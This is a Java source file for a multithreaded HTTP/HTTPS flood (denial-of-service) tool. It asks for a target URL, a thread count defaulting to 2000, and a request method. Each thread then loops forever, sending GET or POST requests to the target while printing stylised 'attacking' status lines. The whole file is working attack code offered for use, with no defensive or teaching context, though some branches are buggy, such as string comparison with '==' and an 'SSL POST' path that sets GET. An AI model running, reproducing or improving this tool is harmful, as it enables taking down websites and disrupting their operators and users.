import java.io.*;
import java.net.*;
import java.util.Scanner;
import java.util.ArrayList;

import javax.net.ssl.HttpsURLConnection;


public class Application implements Runnable {



    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";

    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Application(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Application.url);
                        break;
                    case 2:
                        sslPostAttack(Application.url);
                        break;
                    case 3:
                        getAttack(Application.url);
                        break;
                    case 4:
                        sslGetAttack(Application.url);
                        break;

                }
            }
        } catch (Exception e) {

        }
    }


    public static void main(String[] args) throws Exception {
        String url = "";
        int attakingAmoun = 0;
        Application dos = new Application(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.print("➢ 𝐋𝐢𝐧𝐤 𝐚𝐝𝐝𝐫𝐞𝐬𝐬 : ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("➢ 𝐒𝐭𝐚𝐫𝐭 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 : " + url);

        String[] SUrl = url.split("://");

        System.out.println("《 𝐂𝐡𝐞𝐜𝐤 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 》");
        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }

        System.out.println("〘 𝐏𝐈𝐍𝐎𝐒 𝐉𝐀𝐑 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐓𝐎𝐎𝐋 〙");

        System.out.print("➢ (𝟏𝟕𝟎𝟎𝟎𝟎) | 𝐓𝐡𝐫𝐞𝐚𝐝 : ");
        String amount = in.nextLine();

        if (amount == null || amount.equals(null) || amount.equals("")) {
            Application.amount = 2000;
        } else {
            Application.amount = Integer.parseInt(amount);
        }

        System.out.print("➢ (𝟒𝟎𝟎𝟎) | 𝐌𝐞𝐭𝐡𝐦𝐨𝐝 : ");
        String option = in.nextLine();
        int ioption = 1;
        if (option == "get" || option == "GET") {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }

        Thread.sleep(2000);


        System.out.println("〈 𝐒𝐭𝐚𝐫𝐭 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 〉");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Application.amount; i++) {
            Thread t = new Thread(new Application(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("〈 𝐒𝐮𝐬𝐩𝐞𝐧𝐝 𝐚𝐜𝐜𝐞𝐬𝐬 {𝐒𝐒𝐋} 〉");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("〈 𝐂𝐡𝐞𝐜𝐤 𝐧𝐞𝐭𝐰𝐨𝐫𝐤 𝐜𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 〉");
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("〈 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐚𝐜𝐜𝐞𝐬𝐬 {𝐖𝐄𝐁𝐒𝐈𝐓𝐄} 〉");
        }
        Application.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("〈 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 {𝐒𝐒𝐋} 〉");
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("〈 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 {𝐖𝐄𝐁𝐒𝐈𝐓𝐄} 〉");
        }
        Application.url = url;
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("➢ 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 𝐚𝐜𝐜𝐞𝐬𝐬 {𝐖𝐄𝐁𝐒𝐈𝐓𝐄}" + responseCode + "➢ 𝐂𝐎𝐑𝐑𝐄𝐂𝐓 {𝐅𝐈𝐑𝐄𝐖𝐀𝐋𝐋}" + this.seq);
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("➢ 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 𝐚𝐜𝐜𝐞𝐬𝐬 {𝐖𝐄𝐁𝐒𝐈𝐓𝐄}" + responseCode + "➢ 𝐂𝐎𝐑𝐑𝐄𝐂𝐓 {𝐅𝐈𝐑𝐄𝐖𝐀𝐋𝐋}" + this.seq);
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";

        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("➢ 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 𝐚𝐜𝐜𝐞𝐬𝐬 {𝐖𝐄𝐁𝐒𝐈𝐓𝐄}" + responseCode + "➢ 𝐂𝐎𝐑𝐑𝐄𝐂𝐓 {𝐅𝐈𝐑𝐄𝐖𝐀𝐋𝐋}" + this.seq);
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("➢ 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 𝐚𝐜𝐜𝐞𝐬𝐬 {𝐖𝐄𝐁𝐒𝐈𝐓𝐄} " + responseCode + "➢ 𝐂𝐎𝐑𝐑𝐄𝐂𝐓 {𝐅𝐈𝐑𝐄𝐖𝐀𝐋𝐋}" + this.seq);
    }
}